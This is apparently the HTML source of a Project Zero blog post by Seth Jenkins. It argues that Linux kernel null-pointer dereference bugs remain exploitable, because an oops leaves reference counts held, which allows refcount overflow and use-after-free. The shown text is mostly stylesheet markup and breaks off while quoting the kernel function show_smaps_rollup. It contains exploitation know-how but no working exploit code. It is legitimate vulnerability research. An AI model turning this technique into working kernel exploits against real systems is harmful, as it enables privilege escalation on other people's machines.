\"}ol.lst-kix_ehkygwr8rii2-8{list-style-type:none}.lst-kix_ehkygwr8rii2-6&gt;li{counter-increment:lst-ctn-kix_ehkygwr8rii2-6}ol.lst-kix_gx9cg4br20pa-7.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-7 0}.lst-kix_3558t16xb2i9-0&gt;li:before{content:\"\" counter(lst-ctn-kix_3558t16xb2i9-0,decimal) \". \"}.lst-kix_3558t16xb2i9-2&gt;li{counter-increment:lst-ctn-kix_3558t16xb2i9-2}ol.lst-kix_3558t16xb2i9-8.start{counter-reset:lst-ctn-kix_3558t16xb2i9-8 0}ol.lst-kix_ehkygwr8rii2-8.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-8 0}.lst-kix_ehkygwr8rii2-8&gt;li{counter-increment:lst-ctn-kix_ehkygwr8rii2-8}.lst-kix_gx9cg4br20pa-1&gt;li{counter-increment:lst-ctn-kix_gx9cg4br20pa-1}ol.lst-kix_dt3x5t4funnl-8.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-8 0}.lst-kix_dt3x5t4funnl-5&gt;li{counter-increment:lst-ctn-kix_dt3x5t4funnl-5}ol.lst-kix_gx9cg4br20pa-8{list-style-type:none}ol.lst-kix_dt3x5t4funnl-1.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-1 0}ol.lst-kix_gx9cg4br20pa-4{list-style-type:none}ol.lst-kix_gx9cg4br20pa-5{list-style-type:none}ol.lst-kix_3558t16xb2i9-1.start{counter-reset:lst-ctn-kix_3558t16xb2i9-1 0}ol.lst-kix_gx9cg4br20pa-3.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-3 0}ol.lst-kix_gx9cg4br20pa-6{list-style-type:none}ol.lst-kix_gx9cg4br20pa-7{list-style-type:none}ol.lst-kix_gx9cg4br20pa-0{list-style-type:none}ol.lst-kix_gx9cg4br20pa-1{list-style-type:none}.lst-kix_gx9cg4br20pa-5&gt;li{counter-increment:lst-ctn-kix_gx9cg4br20pa-5}ol.lst-kix_gx9cg4br20pa-2{list-style-type:none}ol.lst-kix_gx9cg4br20pa-3{list-style-type:none}ol.lst-kix_ehkygwr8rii2-1.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-1 0}.lst-kix_gx9cg4br20pa-8&gt;li{counter-increment:lst-ctn-kix_gx9cg4br20pa-8}ol.lst-kix_dt3x5t4funnl-0.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-0 0}ol.lst-kix_dt3x5t4funnl-7.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-7 0}ol.lst-kix_ehkygwr8rii2-7.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-7 0}.lst-kix_dt3x5t4funnl-0&gt;li:before{content:\"\" counter(lst-ctn-kix_dt3x5t4funnl-0,decimal) \". \"}ol.lst-kix_ehkygwr8rii2-0.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-0 0}ol.lst-kix_gx9cg4br20pa-2.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-2 0}.lst-kix_ehkygwr8rii2-2&gt;li{counter-increment:lst-ctn-kix_ehkygwr8rii2-2}ol.lst-kix_3558t16xb2i9-2.start{counter-reset:lst-ctn-kix_3558t16xb2i9-2 0}.lst-kix_3558t16xb2i9-8&gt;li{counter-increment:lst-ctn-kix_3558t16xb2i9-8}ol.lst-kix_gx9cg4br20pa-5.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-5 0}.lst-kix_ehkygwr8rii2-8&gt;li:before{content:\"\" counter(lst-ctn-kix_ehkygwr8rii2-8,lower-roman) \". \"}.lst-kix_dt3x5t4funnl-7&gt;li{counter-increment:lst-ctn-kix_dt3x5t4funnl-7}.lst-kix_ehkygwr8rii2-7&gt;li:before{content:\"\" counter(lst-ctn-kix_ehkygwr8rii2-7,lower-latin) \". \"}.lst-kix_gx9cg4br20pa-3&gt;li{counter-increment:lst-ctn-kix_gx9cg4br20pa-3}.lst-kix_ehkygwr8rii2-6&gt;li:before{content:\"\" counter(lst-ctn-kix_ehkygwr8rii2-6,decimal) \". \"}.lst-kix_ehkygwr8rii2-0&gt;li{counter-increment:lst-ctn-kix_ehkygwr8rii2-0}.lst-kix_ehkygwr8rii2-5&gt;li:before{content:\"\" counter(lst-ctn-kix_ehkygwr8rii2-5,lower-roman) \". \"}ol.lst-kix_3558t16xb2i9-7{list-style-type:none}ol.lst-kix_gx9cg4br20pa-8.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-8 0}.lst-kix_ehkygwr8rii2-2&gt;li:before{content:\"\" counter(lst-ctn-kix_ehkygwr8rii2-2,lower-roman) \". \"}ol.lst-kix_3558t16xb2i9-8{list-style-type:none}.lst-kix_dt3x5t4funnl-8&gt;li{counter-increment:lst-ctn-kix_dt3x5t4funnl-8}ol.lst-kix_3558t16xb2i9-3{list-style-type:none}.lst-kix_ehkygwr8rii2-0&gt;li:before{content:\"\" counter(lst-ctn-kix_ehkygwr8rii2-0,decimal) \". \"}.lst-kix_ehkygwr8rii2-4&gt;li:before{content:\"\" counter(lst-ctn-kix_ehkygwr8rii2-4,lower-latin) \". \"}ol.lst-kix_3558t16xb2i9-4{list-style-type:none}ol.lst-kix_3558t16xb2i9-5{list-style-type:none}.lst-kix_ehkygwr8rii2-3&gt;li:before{content:\"\" counter(lst-ctn-kix_ehkygwr8rii2-3,decimal) \". \"}ol.lst-kix_3558t16xb2i9-6{list-style-type:none}.lst-kix_3558t16xb2i9-0&gt;li{counter-increment:lst-ctn-kix_3558t16xb2i9-0}.lst-kix_ehkygwr8rii2-1&gt;li:before{content:\"\" counter(lst-ctn-kix_ehkygwr8rii2-1,lower-latin) \". \"}.lst-kix_ehkygwr8rii2-1&gt;li{counter-increment:lst-ctn-kix_ehkygwr8rii2-1}.lst-kix_gx9cg4br20pa-2&gt;li{counter-increment:lst-ctn-kix_gx9cg4br20pa-2}ol.lst-kix_dt3x5t4funnl-5.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-5 0}ol.lst-kix_dt3x5t4funnl-0{list-style-type:none}ol.lst-kix_dt3x5t4funnl-1{list-style-type:none}ol.lst-kix_ehkygwr8rii2-2.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-2 0}ol.lst-kix_dt3x5t4funnl-2{list-style-type:none}ol.lst-kix_3558t16xb2i9-0{list-style-type:none}ol.lst-kix_dt3x5t4funnl-3{list-style-type:none}ol.lst-kix_3558t16xb2i9-1{list-style-type:none}ol.lst-kix_dt3x5t4funnl-4{list-style-type:none}.lst-kix_dt3x5t4funnl-6&gt;li{counter-increment:lst-ctn-kix_dt3x5t4funnl-6}ol.lst-kix_3558t16xb2i9-2{list-style-type:none}ol.lst-kix_dt3x5t4funnl-5{list-style-type:none}ol.lst-kix_dt3x5t4funnl-6{list-style-type:none}ol.lst-kix_dt3x5t4funnl-7{list-style-type:none}ol.lst-kix_3558t16xb2i9-4.start{counter-reset:lst-ctn-kix_3558t16xb2i9-4 0}ol.lst-kix_dt3x5t4funnl-8{list-style-type:none}.lst-kix_gx9cg4br20pa-4&gt;li{counter-increment:lst-ctn-kix_gx9cg4br20pa-4}.lst-kix_3558t16xb2i9-1&gt;li{counter-increment:lst-ctn-kix_3558t16xb2i9-1}ol.lst-kix_3558t16xb2i9-7.start{counter-reset:lst-ctn-kix_3558t16xb2i9-7 0}ol.lst-kix_dt3x5t4funnl-2.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-2 0}ol.lst-kix_ehkygwr8rii2-5.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-5 0}.lst-kix_gx9cg4br20pa-1&gt;li:before{content:\"\" counter(lst-ctn-kix_gx9cg4br20pa-1,lower-latin) \". \"}.lst-kix_gx9cg4br20pa-2&gt;li:before{content:\"\" counter(lst-ctn-kix_gx9cg4br20pa-2,lower-roman) \". \"}ol.lst-kix_dt3x5t4funnl-4.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-4 0}.lst-kix_gx9cg4br20pa-6&gt;li{counter-increment:lst-ctn-kix_gx9cg4br20pa-6}.lst-kix_dt3x5t4funnl-4&gt;li{counter-increment:lst-ctn-kix_dt3x5t4funnl-4}ol.lst-kix_gx9cg4br20pa-0.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-0 0}.lst-kix_gx9cg4br20pa-0&gt;li:before{content:\"\" counter(lst-ctn-kix_gx9cg4br20pa-0,decimal) \". \"}.lst-kix_3558t16xb2i9-7&gt;li{counter-increment:lst-ctn-kix_3558t16xb2i9-7}.lst-kix_3558t16xb2i9-3&gt;li{counter-increment:lst-ctn-kix_3558t16xb2i9-3}.lst-kix_ehkygwr8rii2-7&gt;li{counter-increment:lst-ctn-kix_ehkygwr8rii2-7}.lst-kix_ehkygwr8rii2-4&gt;li{counter-increment:lst-ctn-kix_ehkygwr8rii2-4}ol.lst-kix_gx9cg4br20pa-6.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-6 0}ol.lst-kix_ehkygwr8rii2-4.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-4 0}ol.lst-kix_dt3x5t4funnl-3.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-3 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_gx9cg4br20pa-8&gt;li:before{content:\"\" counter(lst-ctn-kix_gx9cg4br20pa-8,lower-roman) \". \"}.lst-kix_gx9cg4br20pa-7&gt;li:before{content:\"\" counter(lst-ctn-kix_gx9cg4br20pa-7,lower-latin) \". \"}.lst-kix_gx9cg4br20pa-5&gt;li:before{content:\"\" counter(lst-ctn-kix_gx9cg4br20pa-5,lower-roman) \". \"}.lst-kix_gx9cg4br20pa-6&gt;li:before{content:\"\" counter(lst-ctn-kix_gx9cg4br20pa-6,decimal) \". \"}ol.lst-kix_3558t16xb2i9-5.start{counter-reset:lst-ctn-kix_3558t16xb2i9-5 0}.lst-kix_gx9cg4br20pa-0&gt;li{counter-increment:lst-ctn-kix_gx9cg4br20pa-0}.lst-kix_gx9cg4br20pa-3&gt;li:before{content:\"\" counter(lst-ctn-kix_gx9cg4br20pa-3,decimal) \". \"}.lst-kix_gx9cg4br20pa-4&gt;li:before{content:\"\" counter(lst-ctn-kix_gx9cg4br20pa-4,lower-latin) \". \"}ol{margin:0;padding:0}table td,table th{padding:0}.EakHiGVfAD-c11{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.EakHiGVfAD-c19{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:italic}.EakHiGVfAD-c5{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.EakHiGVfAD-c12{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:\"Arial\";font-style:normal}.EakHiGVfAD-c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:Consolas,\"Courier New\";font-style:normal}.EakHiGVfAD-c17{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.EakHiGVfAD-c26{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.EakHiGVfAD-c1{font-size:10pt;font-family:Consolas,\"Courier New\";color:#9c27b0;font-weight:400}.EakHiGVfAD-c0{font-size:10pt;font-family:Consolas,\"Courier New\";color:#616161;font-weight:400}.EakHiGVfAD-c7{font-size:10pt;font-family:Consolas,\"Courier New\";color:#000000;font-weight:400}.EakHiGVfAD-c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.EakHiGVfAD-c27{font-size:10pt;font-family:Consolas,\"Courier New\";color:#0f9d58;font-weight:400}.EakHiGVfAD-c13{font-size:10pt;font-family:Consolas,\"Courier New\";color:#455a64;font-weight:400}.EakHiGVfAD-c9{font-size:10pt;font-family:Consolas,\"Courier New\";color:#c53929;font-weight:400}.EakHiGVfAD-c16{border-spacing:0;border-collapse:collapse;margin-right:auto}.EakHiGVfAD-c22{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.EakHiGVfAD-c25{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.EakHiGVfAD-c10{color:inherit;text-decoration:inherit}.EakHiGVfAD-c8{orphans:2;widows:2}.EakHiGVfAD-c15{margin-left:36pt;padding-left:0pt}.EakHiGVfAD-c20{padding:0;margin:0}.EakHiGVfAD-c3{font-weight:400;font-family:\"Courier New\"}.EakHiGVfAD-c21{height:0pt}.EakHiGVfAD-c23{margin-left:36pt}.EakHiGVfAD-c18{vertical-align:super}.EakHiGVfAD-c6{height:11pt}.EakHiGVfAD-c24{font-style:italic}.EakHiGVfAD-c14{font-weight:700}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"c25 doc-content\"&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;Posted by Seth Jenkins, Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;For a fair amount of time&lt;/span&gt;&lt;span&gt;, null-deref bugs were a highly exploitable kernel bug class. Back when the kernel was able to access userland memory without restriction, and userland programs were still able to map the zero page, there were many easy techniques for exploiting null-deref bugs. However with the introduction of modern exploit mitigations such as SMEP and SMAP, as well as &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mmap_min_addr&lt;/span&gt;&lt;span&gt;&amp;nbsp;preventing unprivileged programs from mmap&amp;rsquo;ing low addresses, null-deref bugs are generally not considered &lt;/span&gt;&lt;span&gt;a security issue&lt;/span&gt;&lt;span&gt;&amp;nbsp;in modern kernel versions. &lt;/span&gt;&lt;span&gt;This blog post provides an exploit technique&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;demonstrating that treating these bugs as universally innocuous often leads to faulty evaluations of their relevance to security.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"EakHiGVfAD-c17 EakHiGVfAD-c8\" id=\"h.m1bt0m324efm\"&gt;&lt;span class=\"EakHiGVfAD-c12\"&gt;Kernel oops overview&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;At present, when the Linux kernel triggers a null-deref from within a process context, it generates an &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c22\"&gt;&lt;a class=\"EakHiGVfAD-c101\" href=\"https://en.wikipedia.org/wiki/Linux_kernel_oops\"&gt;oops&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which is distinct from a kernel panic. A panic occurs when the kernel determines that there is no safe way to continue execution, and that therefore all execution must &lt;/span&gt;&lt;span&gt;cease&lt;/span&gt;&lt;span&gt;. However, the kernel does &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c24\"&gt;not&lt;/span&gt;&lt;span&gt;&amp;nbsp;stop all execution during an oops - instead the kernel tries to recover as best as it can and continue &lt;/span&gt;&lt;span&gt;execution&lt;/span&gt;&lt;span&gt;. In the case of a task, that involves throwing out the existing kernel stack and going directly to &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;make_task_dead&lt;/span&gt;&lt;span&gt;&amp;nbsp;which calls &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;do_exit&lt;/span&gt;&lt;span&gt;. The kernel will also publish in dmesg a &amp;ldquo;crash&amp;rdquo; log and kernel backtrace depicting what state the kernel was in when the oops occurred. This may seem like an odd choice to make when memory corruption has clearly occurred - however the intention is to allow kernel bugs to more easily be detectable and loggable under the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c22\"&gt;&lt;a class=\"EakHiGVfAD-c101\" href=\"https://yarchive.net/comp/linux/BUG.html\"&gt;philosophy that a working system is much easier to debug than a dead one.&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;The unfortunate side effect of the oops recovery path is that the kernel is not able to perform any associated cleanup that it would normally perform on a typical syscall error recovery path. This means that any locks that were locked at the moment of the oops stay locked, any refcounts remain taken, any memory otherwise temporarily allocated remains allocated, etc. However, the process that generated the oops, its associated kernel stack, task struct and derivative members etc. can and often will be freed, meaning that depending on the precise circumstances of the oops, it&amp;rsquo;s possible that no memory is actually leaked. This becomes particularly important in regards to exploitation later.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"EakHiGVfAD-c8 EakHiGVfAD-c17\" id=\"h.eq2rlvs1528n\"&gt;&lt;span class=\"EakHiGVfAD-c12\"&gt;Reference count mismanagement overview&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;Refcount mismanagement is a fairly well-known and exploitable issue. In the case where software improperly decrements a refcount, this can lead to a classic UAF primitive. The case where &lt;/span&gt;&lt;span&gt;software&lt;/span&gt;&lt;span&gt;&amp;nbsp;improperly &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c14\"&gt;doesn&amp;rsquo;t&lt;/span&gt;&lt;span&gt;&amp;nbsp;decrement&lt;/span&gt;&lt;span&gt;&amp;nbsp;a refcount (&lt;/span&gt;&lt;span&gt;leaking a &lt;/span&gt;&lt;span&gt;reference) is also often exploitable. If the attacker can cause a refcount to be repeatedly improperly incremented, it is possible that given enough effort the refcount may overflow, at which point the software no longer has any remotely sensible idea of how many refcounts are taken on an object.&lt;/span&gt;&lt;span&gt;&amp;nbsp;In such a case, it is possible for an attacker to destroy the object&lt;/span&gt;&lt;span&gt;&amp;nbsp;by incrementing and decrementing the refcount back to zero after overflowing, while still holding reachable references to the associated memory. &lt;/span&gt;&lt;span&gt;32-bit refcounts are particularly vulnerable to this sort of overflow&lt;/span&gt;&lt;span&gt;. It is important however, that each increment of the refcount allocates little or no &lt;/span&gt;&lt;span&gt;physical memory&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span&gt;Even a single byte allocation is quite expensive if it must be performed 2&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c18\"&gt;32&lt;/span&gt;&lt;span&gt;&amp;nbsp;times&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"EakHiGVfAD-c17 EakHiGVfAD-c8\" id=\"h.35si9vu7f0jz\"&gt;&lt;span class=\"EakHiGVfAD-c12\"&gt;Example null-deref bug&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;When a kernel oops unceremoniously ends a task, any refcounts that the task was holding remain held, even though all memory associated with the task may be freed when the task exits. Let&amp;rsquo;s look at &lt;/span&gt;&lt;span&gt;an example&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;- an otherwise unrelated bug I coincidentally discovered in the very recent past:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.fe2fb833118ca1ee8e3e8160d28a318057211654\"&gt;&lt;/a&gt;&lt;a id=\"t.0\"&gt;&lt;/a&gt;&lt;table class=\"EakHiGVfAD-c16\"&gt;&lt;tr class=\"EakHiGVfAD-c21\"&gt;&lt;td class=\"EakHiGVfAD-c11\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;static&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;int&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;show_smaps_rollup&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;struct&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;seq_file &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;*&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;m&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;void&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;*&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;v&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;struct&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;proc_maps_private &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;*&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;priv &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;m&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;private&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;struct&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;mem_size_stats mss&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;struct&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;mm_struct &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;*&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;struct&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;vm_area_struct &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;*&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;vma&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;unsigned&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;long&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;last_vma_end &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c9\"&gt;0&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;int&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;ret &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c9\"&gt;0&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; priv&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;task &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;get_proc_task&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;priv&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;inode&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c13\"&gt;//task reference taken&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;if&lt;/span&gt;&lt;span 